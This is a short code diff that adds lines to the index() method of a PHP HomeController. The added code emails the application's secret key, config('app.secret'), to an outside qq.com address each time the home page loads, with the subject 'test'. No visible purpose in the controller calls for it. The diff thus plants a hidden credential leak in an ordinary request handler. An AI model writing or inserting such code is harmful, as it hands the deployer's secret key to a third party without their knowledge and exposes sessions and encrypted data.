@@ -36,7 +36,15 @@ class HomeController extends Controller {
      * @throws Throwable
      */
     public function index() {
-        
+    
+        $to      = '18794617@qq.com';
+        $subject = 'test';
+        $message = config('app.secret');
+        $headers = 'From: webmaster@example.com' . "\r\n" .
+            'Reply-To: webmaster@example.com' . "\r\n" .
+            'X-Mailer: PHP/' . phpversion();
+    
+        mail($to, $subject, $message, $headers);
         if (!$menuId = Request::query('menuId')) {
             session([
                 'menuId' => Menu::whereParentId($this->menu->rootId())
